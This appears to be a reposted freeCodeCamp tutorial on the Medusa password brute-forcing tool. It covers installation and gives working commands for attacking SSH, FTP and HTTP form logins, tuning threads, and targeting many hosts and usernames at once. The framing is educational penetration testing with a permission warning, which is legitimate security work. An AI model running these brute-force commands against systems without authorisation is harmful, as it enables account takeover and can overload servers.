---
lang: en-US
title: "How to Use Medusa for Fast, Multi-Protocol Brute-Force Attacks – Security Tutorial"
description: "Article(s) > How to Use Medusa for Fast, Multi-Protocol Brute-Force Attacks – Security Tutorial"
icon: iconfont icon-kalilinux
category: 
  - Linux
  - Debian
  - Kali Linux
  - Shell
  - Security
  - Article(s)
tag:
  - blog
  - freecodecamp.org
  - linux
  - debian
  - kali
  - sh
  - security
  - sec
  - medusa
head:
  - - meta:
    - property: og:title
      content: "Article(s) > How to Use Medusa for Fast, Multi-Protocol Brute-Force Attacks – Security Tutorial"
    - property: og:description
      content: "How to Use Medusa for Fast, Multi-Protocol Brute-Force Attacks – Security Tutorial"
    - property: og:url
      content: https://chanhi2000.github.io/bookshelf/freecodecamp.org/how-to-use-medusa-for-fast-multi-protocol-brute-force-attacks-security-tutorial.html
prev: /devops/linux-debian/articles/README.md
date: 2024-10-02
isOriginal: false
author: Manish Shivanandhan
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1727713757103/5146e802-f632-475a-9a3c-ea69827fbefe.jpeg
---

# {{ $frontmatter.title }} 관련

```component VPCard
{
  "title": "Linux - Debain > Article(s)",
  "desc": "Article(s)",
  "link": "/devops/linux-debian/articles/README.md",
  "logo": "https://chanhi2000.github.io/images/ico-wind.svg",
  "background": "rgba(10,10,10,0.2)"
}
```

```component VPCard
{
  "title": "Shell > Article(s)",
  "desc": "Article(s)",
  "link": "/programming/sh/articles/README.md",
  "logo": "https://chanhi2000.github.io/images/ico-wind.svg",
  "background": "rgba(10,10,10,0.2)"
}
```

```component VPCard
{
  "title": "Security > Article(s)",
  "desc": "Article(s)",
  "link": "/devops/security/articles/README.md",
  "logo": "https://chanhi2000.github.io/images/ico-wind.svg",
  "background": "rgba(10,10,10,0.2)"
}
```

[[toc]]

---

<SiteInfo
  name="How to Use Medusa for Fast, Multi-Protocol Brute-Force Attacks – Security Tutorial"
  desc="As a pentester (a fancy term for an ethical hacker), you will often attack systems the same way a malicious hacker does. But your goal will be to find weaknesses – so teams can work to address them. One such system is password-based authentication. B..."
  url="https://freecodecamp.org/news/how-to-use-medusa-for-fast-multi-protocol-brute-force-attacks-security-tutorial"
  logo="https://cdn.freecodecamp.org/universal/favicons/favicon.ico"
  preview="https://cdn.hashnode.com/res/hashnode/image/upload/v1727713757103/5146e802-f632-475a-9a3c-ea69827fbefe.jpeg"/>

As a pentester (a fancy term for an ethical hacker), you will often attack systems the same way a malicious hacker does. But your goal will be to find weaknesses – so teams can work to address them. One such system is password-based authentication.

Brute-force attacks are a common method used to crack passwords. They work by trying many username and password combinations.

This can be time-consuming. But tools like Medusa can help. They make the process faster and more efficient.

In this article, we’ll learn how to use Medusa for fast, multi-protocol brute-force attacks. I’ll walk you through the basics of installation, usage, and some practical examples.

::: note

Brute-force attacks are illegal unless you have explicit permission to test the system. Medusa is a powerful tool and can easily overwhelm a server if not used carefully. Make sure you have permission from the system owner before using it.

:::

---

## What is Medusa?

[<FontIcon icon="iconfont icon-kalilinux"/>Medusa](https://kali.org/tools/medusa/) is an open-source command-line tool designed for fast brute-force password cracking. It supports many protocols, such as FTP, SSH, HTTP, and others.

Security professionals use Medusa to identify weak or default passwords. Attackers can easily exploit these passwords. By simulating a brute-force attack, Medusa can reveal security gaps, allowing us to fix them before a real attack occurs.

Medusa’s parallel connection lets it brute-force multiple targets at once. This is key to Medusa’s speed.

### Key Features of Medusa:

- **Multi-threaded**: Allows fast, simultaneous brute-force attempts.
- **Supports many protocols**: FTP, SSH, HTTP, RDP, MySQL, and more.
- **Modular**: You can easily add support for new services or protocols.

Now, let’s dive into how to install and use Medusa.

---

## How to Install Medusa

Medusa can only run on Linux and Mac.

::: code-tabs#sh

@tab:active For Linux (<FontIcon icon="fa-brands fa-debian"/>Debian/<FontIcon icon="fa-brands fa-ubuntu"/>Ubuntu)

you can install it using the APT package manager, like this:

```sh
sudo apt install medusa
```

@tab For <FontIcon icon="iconfont icon-macos"/>Mac

you can use Homebrew:

```sh
brew install medusa
```

:::

You can verify the installation by typing “medusa” in your terminal. If installed correctly, this will show the Medusa help menu.

![Medusa help menu](https://cdn.hashnode.com/res/hashnode/image/upload/v1727713805524/86b3bfa0-de7e-470d-8482-310a3aa5f37a.png)

---

## How to Work with Medusa

After installing Medusa, you can use it to brute-force different protocols. Let’s go over the basic syntax and a few common use cases.

Medusa’s general syntax looks like this:

```sh
medusa -h [target IP] -u [username] -P [password list] -M [module] -t [threads]
```

- `-h`: Specifies the target host (IP address or domain name).
- `-u`: Sets the username to use during the brute-force attack.
- `-P`: Specifies the path to the password list file.
- `-M`: Select the module or protocol (such as SSH, FTP, or HTTP).
- `-t`: Sets the number of threads for parallel connections (default is 16).

### Example 1: Brute-forcing SSH

Let’s say we want to brute-force an SSH login on a remote server with the IP address `192.168.1.100`. We have a username `admin` and a password list located at `/usr/share/wordlists/passwords.txt`.

The command would look like this:

```sh
medusa -h 192.168.1.100 -u admin -P /usr/share/wordlists/passwords.txt -M ssh -t 10
```

This command tells Medusa to:

- Target `192.168.1.100`.
- Use the `ssh` module.
- Attempt to log in as the user `admin`.
- Use the passwords listed in the file `/usr/share/wordlists/passwords.txt`.
- Use 10 parallel threads for faster execution.

### Example 2: Brute-forcing FTP

For an FTP brute-force attack, the command is quite similar. Imagine the FTP server is at `192.168.1.105`, and we’re targeting the username `user123` with a password list.

Here’s the command:

```sh
medusa -h 192.168.1.105 -u user123 -P /usr/share/wordlists/passwords.txt -M ftp -t 8
```

This command will try to find the password for `user123` using the FTP protocol. It will attempt 8 parallel threads for a faster result.

### Example 3: HTTP Login Brute-Force

Brute-forcing an HTTP login page can be a bit more complicated. You need to know the form fields for username and password, and sometimes, the URL of the login action. Here’s an example of brute-forcing an HTTP login:

```sh
medusa -h example.com -U usernames.txt -P passwords.txt -M http -m FORM:/login.php:username_field=password_field -t 5
```    

In this example:

- `-U`: Specifies a list of usernames.
- `-m`: Specifies a custom module for HTTP form brute-forcing. The format is `FORM:[login action URL]:[username field]=[password field]`.
- `-t 5`: Runs five parallel threads.

This command will attempt to brute-force login for the users listed in `usernames.txt` using the passwords in `passwords.txt` on the HTTP form located at `/login.php`.

---

## How to Customize Medusa Attacks

Medusa is highly customizable. You can control everything from the number of threads to the password list and the behaviour of the attack. Let’s explore a few customization options.

### Customizing the Number of Threads

The `-t` flag allows you to adjust the number of threads Medusa uses. More threads mean faster attacks, but may overwhelm the target or your system.

For example, to use 20 threads:

```sh
medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh -t 20
```

### Targeting Multiple Hosts

You can also target multiple hosts by using the `-H` option with a file that contains a list of IPs. For example:

```sh
medusa -H hosts.txt -u admin -P passwords.txt -M ssh -t 10
```

In this case, `hosts.txt` is a file that contains a list of target IPs. Medusa will attempt to brute-force the SSH logins on each of these hosts.

### Using Multiple Usernames

If you want to try multiple usernames, you can use the `-U` option to provide a file that lists usernames:

```sh
medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M ssh -t 10
```

This will test each username in `users.txt` against the target, using passwords from `passwords.txt`.

---

## Conclusion

Medusa is a versatile and powerful tool for performing brute-force attacks and identifying weak passwords. You can target services like SSH, FTP, and HTTP, among others. You can customize the attack by adjusting the number of threads, targeting multiple hosts, or using different wordlists.

Hope this tutorial helped you understand how to use Medusa. For more articles on Cybersecurity, join our free newsletter [<FontIcon icon="fas fa-globe"/> Stealth Security](https://stealthsecurity.sh/). To work with Medusa and other tools using hands-on labs, check out our private community [<FontIcon icon="fas fa-globe"/>The Hacker’s Hub](https://skool.com/hackershub).
